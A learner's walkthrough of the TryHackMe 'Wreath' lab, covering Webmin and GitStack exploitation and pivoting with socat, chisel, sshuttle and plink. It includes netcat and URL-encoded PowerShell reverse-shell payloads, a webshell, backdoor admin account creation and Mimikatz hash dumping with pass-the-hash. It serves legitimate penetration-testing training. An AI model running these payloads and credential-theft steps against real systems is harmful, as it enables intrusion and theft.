# WREATH - TRYHACKME

# back story: 
"So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"
You take a moment to think about it, before deciding to accept the job -- it's for a friend after all.
....
From this we can take away the following pieces of information:

There are three machines on the network
There is at least one public facing webserver
There is a self-hosted git server somewhere on the network
The git server is internal, so Thomas may have pushed sensitive information into it
There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
The (assumed) Windows PC cannot be accessed directly from the webserver

# nmap result:
ORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-08T09:08:50
| Not valid after:  2022-12-08T09:08:50
| MD5:   185c 96d9 a527 9b3e f8c3 417e 898e 67e8
|_SHA-1: db6b 5160 de0b 63e7 60d6 2619 d807 4457 02a6 376f
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F6E7EAF456B33D34D7033E3A6D92F9EC
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%)_

with 
http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
from port 80, we know OS is centos(-O not always right, expose via service sometime more accurate)

let's access webserver port
http://10.200.72.200 redirect to https://thomaswreath.thm/
ok, let's add this domain name to /etc/hosts file
```bash
subl /etc/hosts : 10.200.72.200    thomaswreath.thm
```
access https://thomaswreath.thm/ we can see that's a introduction page of thomas wreath.
we found his phone number: 

at port 10000 have http server  MiniServ 1.890 (Webmin httpd)
ok interesting, doing some goole search, we find out this version vulnerable to RCE: https://medium.com/@foxsin34/webmin-1-890-exploit-unauthorized-rce-cve-2019-15107-23e4d5a9c3b4

we found python exploit tool, let's clone it to our machine
git clone 
exploit:
```bash
python3 10.200.72.200 10000 'id'
#> (root)
# ok, let's get a reverse shell
# we can't send command and get shell, i don't know why, so we download rce file to the remote machine and execute them
# file shell-devme.ph
..
# local machine:
nc -nlvp 9999
# remote machine
python3 10.200.72.200 10000 'chmod 700 shell-devme.py; python3 shell-devme.py'
# we have a reverse shell!
# steal id_rsa and make port forwarding/proxy/tunnel(pivoting) to attack other machine in local network
```
Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.
*A proxy is good if* we want to redirect *lots of different kinds of traffic* into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.
*Port Forwarding* tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

Metasploit Framework Meterpreter command can be used to create a port forward: portfwd

# The more we know about our target, the more options we have available to us.
Enumeration:
	Using material found on the machine. The hosts file or ARP cache, for example
	Using pre-installed tools
	Using statically compiled tools
	Using scripting techniques
	Using local tools through a proxy
These are written in the order of preference. Using *local tools through a proxy is incredibly slow*, so should only be used as a last resort.  Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we'll cover below).

```bash
arp -a
ip-10-200-72-1.eu-west-1.compute.internal (10.200.72.1) at 02:5d:46:44:8b:25 [ether] on eth0
```

The following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
Port scanning in bash can be done (ideally) entirely natively:
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

I guess wreath block connection outside the network so you can't directly connect to it, like if you want to create a port forwarding, you have to do it reverse, on it machine. I mean i can't explain why ssh with private key encouter error invalid format so, that's for today!

# plink.exe
Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:
```bash
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```
The cmd.exe /c echo y at the start is for non-interactive shells 

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using *sudo apt install putty-tools*. After downloading the tool, conversion can be done with:
```bash
puttygen KEYFILE -o OUTPUT_KEY.ppk
```
The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding (*despite the private key being converted*, it will still work perfectly with the *same public key* we added to the authorized_keys file before).

**Note**: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe.

# Socat
Socat is not just great for *fully stable Linux shells*[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have *learning the syntax*), is that it is very *rarely installed by default* on a target. That said, static binaries are easy to find for both Linux and Windows. Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Socat can be used to create encrypted connections.

It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

*Generally speaking*, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward.

**Reverse Shell Relay**

In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard netcat listener on our attacking box *(sudo nc -lvnp 443)*. Next, on the compromised server, use the following command to start the relay:
```bash
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```
In senario when remote network block machine in network connect outside the world
From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat *on the remote server* to simulate receiving a reverse shell from *the target server*:
```bash
# attacking machine
sudo nc -nlvp 443
# compromised server
./socat tcp-l:8000 tcp:10.50.73.2:443 & # &: backgrounds the listener, turning it into a job.
chmod +x  ./nc
./nc 127.0.0.1 8000 -e /bin/bash
# attacking machine reveive connection...!
```
This technique can also be chained quite easily.

**Port Forwarding -- Easy**
The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server.
```bash
# compromised server 
./socat tcp-l:LISTENING_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT &
```
The fork option is used to put every connection into a new process, and the reuseaddr option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection.

**Port Forwarding -- Quiet**
The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat.
This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:
```bash
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```
This opens up two ports: 8000 and 8001, creating a local port relay(chuyen tiep). What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the *compromised relay server* (172.16.0.5 in the previous example) we execute this command:
```bash
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```
Now if target ip is host a web server, we could go to web browser localhost:8000 to access

# Chisel
Chisel is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, the fact it doesn't require SSH access on the compromised target is a big bonus.

**Reverse SOCKS Proxy**:
Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.

On our own attacking box we would use 
```bash
./chisel server -p LISTENING_PORT --reverse &
```
On the compromised host, we would use the following command:
```bash
./chisel client ATTACKING_IP:ATTACKING_PORT R:socks &
```
Notice that, despite connecting back to port successfully, the actual proxy has been opened on *127.0.0.1:1080*. As such, we will be using port 1080 when sending data through the proxy.

Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended.

**Forward SOCKS Proxy**:

First, on the compromised host we would use:
```bash
./chisel server -p LISTEN_PORT --socks5
```
On our own attacking box we would then use:
```bash
./chisel client TARGET_IP:SERVER_PORT PROXY_PORT:socks
```
In this command, PROXY_PORT is the port that will be opened for the proxy.

*Proxychains Reminder*:
When sending data through either of these proxies, we would *need* to set the port in our *proxychains configuration*. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5

```bash
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

**Remote Port Forward**:
A remote port forward is when we connect back from a compromised target to create the forward.
For a remote port forward, `on our attacking machine` we use the exact same command as before:
```bash
./chisel server -p LISTEN_PORT --reverse &
```
The command to connect back is slightly different this time, however:
```bash
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

**Local Port Forward**:
As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:

```bash
./chisel server -p LISTEN_PORT
```
We now connect to this from our attacking machine like so:
```bash
./chisel client SERVER_IP:SERVER_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```
**Note**: When using Chisel on Windows, it's important to remember to upload it with a file extension of .exe

# sshuttle
It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy *without* the use of proxychains (or an equivalent).

Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle *only works on Linux* targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it is an option, it tends to be a superb bet!

First of all we need to *install* sshuttle. On Kali this is as easy as using the apt package manager:
```bash
sudo apt install sshuttle
```
The base command for *connecting to a server* with sshuttle is as follows:
```bash
sshuttle -r username@address subnet 
```
For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
*sshuttle -r user@172.16.0.5 172.16.0.0/24*

Rather than specifying subnets, we could also use the -N option which attempts to determine them automatically based on the compromised server's own routing table:
```bash
sshuttle -r username@address -N
```
Bear in mind that this may not always be successful though!
As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.

If this has worked, you should see the following line:
*c : Connected to server.*
Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication?

Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the --ssh-cmd switch.

This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no arguments.

So, when using key-based authentication, the final command looks something like this:
```bash
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET # networkaddress/prefix_subnet
```
**Please** Note: When using sshuttle, you may encounter an error that looks like this:
```bash
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```
This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to.
To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the -x switch. 
To use our earlier example:
```bash
# connecting ssh to the server with sshuttle
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```
This will allow sshuttle to create a connection without disrupting itself.

# SSH
```bash
# compromised machine
ssh -L 8001:127.0.0.1:8000 .......
```

# Conclusion
	Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
	SSH can be used to create both port forwards, and proxies
	plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
	Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
	Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
	sshuttle is a nicer way to create a proxy when we have SSH access on a target
Note: If using socat, or any other techniques that open up a port on the compromised host (in the course of this network), please make sure to use a port above 15000, for the sake of other users in earlier sections of the course. (de bon user trc scan nmap chi quet 1-15000)


# Enumeration
download binary nmap to the compromised server and start scaning the network
```bash
nmap -sn 10.200.72.1-255 -oN scan-devme # -sn: only check open host in the network
# Nmap scan report for ip-10-200-72-100.eu-west-1.compute.internal (10.200.72.100)
# Nmap scan report for ip-10-200-72-150.eu-west-1.compute.internal (10.200.72.150),
# some port are out of scope of this challenge so we don't need to mind about it
```
Found 2 hosts in the network, let's scan the port(below 1500)
```bash
nmap -p-1500 -v -T4 10.200.72.100
# all ports filtered
nmap -p-1500 -v -T4 10.200.72.150
# PORT     STATE SERVICE
# 80/tcp   open  http
# 3389/tcp open  ms-wbt-server
# 5357/tcp open  wsdapi
# 5985/tcp open  wsman
```
ok, let's access port 80 on host 10.20.72.150. Because we cannot directly access it so we have to create a port forwarding from compromised server and forward it to this host when we access from our machine.
```bash
# we using socat this time
./socat-devme tcp-l:20000 tcp:10.200.72.150:80 &
# access from our browser
http://10.200.72.200:20000
```
As a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. This is because the firewall on the CentOS target will prove problematic with some of the techniques shown here. 
DAMN IT!

access the websever -> gitstack
```bash
searchsploit gitstack
searchsploit -m 43777 # EDBID
```
Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:
```bash
dos2unix ./43777.py
```
This  can also be done manually with sed if dos2unix is unavailable:
```bash
sed -i 's/\r//' ./EDBID.py
```
scripts - add shebang header, edit ip address
```bash
#!/usr/bin/python2
#!/usr/bin/python3
#/bin/sh
```
This means that if we execute the script using ./exploit.py, it will be executed by the correct interpreter.
```bash
./43777.py
# authority system -> already admin

#webshell rce
curl -X POST http://10.200.72.150:20000/web/exploit-USERNAME.php -d "a=COMMAND"
curl 

```

Before we go for a reverse shell, we need to establish whether or not *this target is allowed to connect to the outside world*. The typical way of doing this is by executing the ping command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.
To start up a TCPDump listener we would use the following command:
```bash
tcpdump -i tun0 icmp
# Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using ip -a link to see the available interfaces.
# Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):
ping -n 3 ATTACKING_IP
```
all request timeout
Looks like we're going to need to think outside the box to catch this shell.

We have two easy options here:
Given we have a fully stable shell on .200, we could upload a static copy of netcat and just catch the shell here
We could set up a relay on .200 to forward a shell back to a listener

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:
```bash
firewall-cmd --zone=public --add-port PORT/tcp
```
In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).

With that done, set up either a listener or a relay on .200.
```bash
# compromised server
./socat-devme tcp-l:20001.fork,reuseaddr tcp:10.50.73.113:2003 &
```
# url encode powershell reverse shell:
powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.72.200%27%2C20001%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```bash
curl curl curl -X POST http://10.200.72.200:20000/web/exploit-devme.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.72.200%27%2C20001%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```
Ok, reverse shell from .150 send to compromised server(.200) and being forwarded to our machine. We have a reverse shell!!

# Stabilisation & Post Exploitation

From the enumeration we did on this target we know that *ports 3389 and 5985 are open*. This means that (using an account with the correct privileges) we should be able to obtain either a *GUI through RDP* (port 3389) or a stable *CLI shell using WinRM* (port 5985).

Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.

We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use anywhere else.

```bash
# First we create the account itself:
net user USERNAME PASSWORD /add
# net user devme 123 /add
# Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:
net localgroup Administrators USERNAME /add
# net localgroup Administrators devme /add
net localgroup "Remote Management Users" USERNAME /add
# net localgroup "Remote Management Users" devme /add
```
We can now use this account to get stable access to the box!
As mentioned previously, we could use either RDP or WinRM for this.

Note: Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network.

Let's access the box over WinRM. For this we'll be using an awesome little tool called evil-winrm.
```bash
# This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:
sudo gem install evil-winrm

# With evil-winrm installed, we can connect to the target with the syntax shown here:
evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP
```
*If you used an SSH portforward rather than sshuttle to access* the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -i 127.0.0.1 -P 58950).

Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm. 

---------------------------------------------------------------------------------------------------------------------------------------------------------------

Now let's look at connecting over RDP for a GUI environment.

There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can 
```bash
#install xfreerdp with the command:
sudo apt install freerdp2-x11

#As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
xfreerdp /v:IP /u:USERNAME /p:PASSWORD
```
Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.

When authentication has successfully taken place, a new window will open giving GUI access to the target.
That said, we can do a lot more with xfreerdp. These switches are particularly useful:-

**/dynamic-resolution** -- allows us to resize the window, adjusting the resolution of the target in the process
**/size:WIDTHxHEIGHT** -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
**+clipboard** -- enables clipboard support
**/drive:LOCAL_DIRECTORY,SHARE_NAME** -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: /drive:.,share, with the period (.) referring to the current directory


A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share



With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
\\tsclient\share\mimikatz\x64\mimikatz.exe

---------------------------------------------------------------------------------------------------------------------------------------------------------------
Even with evil-winrm, the shell seem not interactive so when running mimikatz, we can not interact with mimikatz interface, however, we finnallt find a way.
```bash
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit
```
We can save administrator password hash and can use this to login next time even if we don't know password plaintext
```bash
evil-winrm -u Administrators -H <admin-hash-password> -i <IP> [-P <port>, when port are not default or we have to pivoting]
```
# machine ip addr: 10.200.72.200
# my tunnel ip addr: 10.50.73.113
